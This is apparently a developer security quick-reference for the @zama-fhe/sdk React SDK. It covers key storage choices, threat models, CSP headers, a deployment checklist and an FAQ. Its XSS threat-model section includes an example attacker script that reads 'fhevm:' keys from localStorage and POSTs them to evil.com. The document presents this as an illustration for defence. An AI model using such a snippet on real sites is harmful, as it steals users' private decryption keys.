# 🔒 Security Quick Reference

> **Quick security guide for developers using `@zama-fhe/sdk`**

[![Security](https://img.shields.io/badge/security-reviewed-green.svg)](./SECURITY_ANALYSIS.md)
[![OWASP](https://img.shields.io/badge/OWASP-25%25-orange.svg)](./SECURITY_ANALYSIS.md)
[![Last Updated](https://img.shields.io/badge/updated-2026--02--03-blue.svg)]()

---

## 📖 Table of Contents

- [TL;DR - Security Levels](#tldr---security-levels)
- [Storage Comparison](#storage-comparison)
- [Threat Models](#threat-models)
- [Configuration Examples](#configuration-examples)
- [CSP Headers](#csp-headers-content-security-policy)
- [Pre-Deployment Checklist](#pre-deployment-checklist)
- [Common Mistakes](#common-mistakes)
- [FAQ](#faq)
- [Support](#support)

---

## ⚡ TL;DR - Security Levels

### 🟢 SAFE for Production

```typescript
// Option 1: Memory storage (most secure, re-sign on refresh)
import { memoryStorage } from '@zama-fhe/sdk';

<FhevmProvider storage={memoryStorage} ... />
```

```typescript
// Option 2: Encrypted storage (secure + persistent)
import { EncryptedStorageAdapter, generateDeviceKey } from '@zama-fhe/sdk';

const key = await generateDeviceKey();
const storage = new EncryptedStorageAdapter(localStorage, { key });

<FhevmProvider storage={storage} ... />
```

```typescript
// Option 3: Session storage (secure, cleared on tab close)
import { sessionStorageAdapter } from '@zama-fhe/sdk';

<FhevmProvider storage={sessionStorageAdapter} ... />
```

---

### ⚠️ USE WITH CAUTION

```typescript
// Plain localStorage - Accessible to any JavaScript on your page
// Only use if:
// - You understand XSS risks
// - Your app has strong XSS protections
// - You're okay with persistent storage
import { localStorageAdapter } from '@zama-fhe/sdk';

<FhevmProvider storage={localStorageAdapter} ... />
```

---

### 🔴 NEVER DO THIS

```typescript
// ❌ Accessing private key directly (deprecated, will be removed)
const sig = await loadSignature();
console.log(sig.privateKey); // ⚠️ Exposes sensitive key!

// ❌ Logging signature objects
console.log(sig); // May leak privateKey in v1.x

// ❌ Storing keys in cookies or URL params
document.cookie = `fhevm_key=${sig.privateKey}`; // ❌ NEVER!
window.location.hash = sig.privateKey; // ❌ NEVER!
```

---

## Storage Comparison

| Storage Type | Security | Persistence | Use Case |
|-------------|----------|-------------|----------|
| **memoryStorage** | 🟢🟢🟢 Highest | Cleared on refresh | Maximum security |
| **EncryptedStorage** | 🟢🟢🟢 High | Persistent | Production apps |
| **sessionStorage** | 🟢🟢 Medium | Cleared on tab close | Temporary sessions |
| **localStorage** | ⚠️ Low | Persistent | Development only |
| **No storage** | 🟢🟢🟢 Highest | None | Re-sign every time |

---

## Threat Models

### XSS Attack

**Scenario:** Attacker injects malicious JavaScript

```javascript
// Attacker's script
for (let key of Object.keys(localStorage)) {
  if (key.startsWith('fhevm:')) {
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: localStorage.getItem(key)
    });
  }
}
```

**Protection:**
- ✅ Use encrypted storage
- ✅ Configure CSP headers
- ✅ Sanitize user inputs
- ✅ Audit third-party dependencies

---

### Malicious Browser Extension

**Scenario:** Extension reads page storage

**Protection:**
- ✅ Use memoryStorage (extensions can't access in-memory data)
- ✅ Use sessionStorage (cleared when tab closes)
- ⚠️ localStorage is accessible to extensions

---

### Physical Device Access

**Scenario:** Attacker has physical access to device

**Protection:**
- ✅ Use encrypted storage with password
- ✅ Short expiration times (≤24 hours)
- ✅ Clear keys on logout
- ⚠️ Plain localStorage persists indefinitely

---

## Configuration Examples

### Next.js App (Production)

```typescript
// app/providers.tsx
'use client';

import { FhevmProvider, createFhevmConfig } from '@zama-fhe/sdk';
import { EncryptedStorageAdapter, generateDeviceKey } from '@zama-fhe/sdk/storage';
import { sepolia } from '@zama-fhe/sdk/chains';

const config = createFhevmConfig({
  chains: [sepolia],
});

// Generate device key once and store in IndexedDB
const deviceKey = await generateDeviceKey();
const storage = new EncryptedStorageAdapter(localStorage, { key: deviceKey });

export function Providers({ children }) {
  return (
    <FhevmProvider
      config={config}
      storage={storage}
      securityLevel="production"
      {...wagmiProps}
    >
      {children}
    </FhevmProvider>
  );
}
```

---

### Development Setup

```typescript
// dev/providers.tsx
import { memoryStorage } from '@zama-fhe/sdk';
import { MemorySecurityLogger, setSecurityLogger } from '@zama-fhe/sdk/security';

// Enable security logging in dev
const logger = new MemorySecurityLogger();
setSecurityLogger(logger);

export function DevProviders({ children }) {
  return (
    <FhevmProvider
      config={config}
      storage={memoryStorage} // Simple, secure for dev
      securityLevel="development"
      securityLogger={logger}
      {...wagmiProps}
    >
      {children}
    </FhevmProvider>
  );
}
```

---

### High-Security App

```typescript
// No persistent storage, re-sign every time
<FhevmProvider
  config={config}
  storage={undefined} // No caching
  securityLevel="strict"
  {...wagmiProps}
>
  {children}
</FhevmProvider>
```

---

## CSP Headers (Content Security Policy)

### Recommended Configuration

```nginx
# nginx.conf
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'unsafe-eval';
  connect-src 'self' https://gateway.zama.ai https://*.infura.io;
  worker-src 'self' blob:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
" always;
```

### Next.js Configuration

```javascript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-eval'",
              "connect-src 'self' https://gateway.zama.ai",
              "object-src 'none'",
            ].join('; '),
          },
        ],
      },
    ];
  },
};
```

---

## Pre-Deployment Checklist

### Storage

- [ ] ✅ Using encrypted storage OR memoryStorage OR sessionStorage
- [ ] ❌ NOT using plain localStorage in production
- [ ] ✅ Storage choice documented in code comments

### Configuration

- [ ] ✅ `securityLevel` set to `"production"` or `"strict"`
- [ ] ✅ CSP headers configured on server
- [ ] ✅ HTTPS enforced (no HTTP in production)

### Code Quality

- [ ] ✅ No `console.log(signature)` or `console.log(privateKey)` in production
- [ ] ✅ Dependencies audited (`npm audit`)
- [ ] ✅ No deprecated API usage warnings

### Key Management

- [ ] ✅ Signature expiration ≤24 hours
- [ ] ✅ Keys cleared on logout
- [ ] ✅ Key rotation plan documented

### Monitoring

- [ ] ✅ Security event logging enabled
- [ ] ✅ Monitoring for failed decrypt attempts
- [ ] ✅ Alerts for suspicious activity

---

## Common Mistakes

### ❌ Mistake 1: Logging Signatures

```typescript
// ❌ BAD
const signature = await loadSignature();
console.log('Loaded signature:', signature);
// Exposes privateKey in console!

// ✅ GOOD
console.log('Loaded signature for:', signature.userAddress);
```

---

### ❌ Mistake 2: Using localStorage in Production

```typescript
// ❌ BAD
<FhevmProvider storage={localStorageAdapter} />

// ✅ GOOD
<FhevmProvider storage={encryptedStorage} />
```

---

### ❌ Mistake 3: Long Expiration Times

```typescript
// ❌ BAD (custom implementation)
const durationDays = 365; // Keys valid for 1 year!

// ✅ GOOD (use SDK defaults)
// SDK defaults to 1 day for security
```

---

### ❌ Mistake 4: No CSP Headers

```typescript
// ❌ BAD
// No CSP = vulnerable to XSS

// ✅ GOOD
// Add CSP headers in your server config
```

---

## Security Event Logging

### Enable Logging

```typescript
import { MemorySecurityLogger, setSecurityLogger } from '@zama-fhe/sdk/security';

// In app initialization
const logger = new MemorySecurityLogger(1000); // Keep last 1000 events
setSecurityLogger(logger);
```

### Monitor Events

```typescript
import { getSecurityLogger, SecurityEventType } from '@zama-fhe/sdk/security';

// Check for failed decrypts
const logger = getSecurityLogger();
const failures = logger.getEvents({
  type: SecurityEventType.DECRYPT_FAILED,
});

if (failures.length > 10) {
  alert('Multiple decryption failures detected!');
}
```

### Custom Logger

```typescript
import { SecurityLogger, SecurityEvent } from '@zama-fhe/sdk/security';

class ProductionSecurityLogger implements SecurityLogger {
  log(event: SecurityEvent): void {
    // Send to your monitoring service
    fetch('/api/security-events', {
      method: 'POST',
      body: JSON.stringify(event),
    });
  }

  getEvents(): SecurityEvent[] {
    return []; // Not needed for production
  }

  clearEvents(): void {}
}

setSecurityLogger(new ProductionSecurityLogger());
```

---

## FAQ

### Q: Is localStorage safe for production?

**A:** No, plain localStorage is **not safe** for production. It's accessible to:
- Any JavaScript on your page (XSS attacks)
- Browser extensions
- Physical access to device

Use **EncryptedStorageAdapter** or **sessionStorage** instead.

---

### Q: What's the difference between memoryStorage and no storage?

**A:**
- **memoryStorage**: Caches signature in memory (one sign per page load)
- **No storage** (`storage={undefined}`): No caching (sign before every decrypt)

Both are equally secure, but no storage has worst UX (more wallet popups).

---

### Q: Can I use localStorage for development?

**A:** Yes, but add this check:

```typescript
const storage = process.env.NODE_ENV === 'production'
  ? encryptedStorage
  : localStorageAdapter;
```

---

### Q: How do I migrate from localStorage to encrypted storage?

**A:** See [SECURITY_IMPROVEMENT_PLAN.md](./SECURITY_IMPROVEMENT_PLAN.md) for full migration guide.

Quick version:
```typescript
// 1. Generate encryption key
const key = await generateDeviceKey();

// 2. Replace storage
<FhevmProvider
  storage={new EncryptedStorageAdapter(localStorage, { key })}
  ...
/>

// 3. Users will need to re-sign (old keys are unencrypted)
```

---

### Q: What happens if someone steals my private key?

**A:** They can decrypt your encrypted balances and transactions **until the key expires** (default 24 hours).

**Mitigation:**
- Use short expiration times
- Implement key rotation
- Monitor for suspicious activity
- Clear keys on logout

---

### Q: Should I implement my own encryption?

**A:** ❌ **No.** Use the SDK's `EncryptedStorageAdapter` which:
- Uses Web Crypto API (secure, audited)
- Implements AES-GCM (authenticated encryption)
- Handles IV generation correctly
- Has been security reviewed

Rolling your own crypto is **dangerous**.

---

## Support

### Security Issues

**DO NOT** create public GitHub issues for security vulnerabilities.

Contact: security@zama.ai

### General Questions

- GitHub Discussions: https://github.com/zama-ai/react-sdk/discussions
- Discord: https://discord.fhe.org

---

## References

- [Full Security Analysis](./SECURITY_ANALYSIS.md)
- [Implementation Plan](./SECURITY_IMPROVEMENT_PLAN.md)
- [OWASP Crypto Storage](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)

---

**Last Updated:** 2026-02-03
**SDK Version:** v1.x (v2.0 will have stricter defaults)
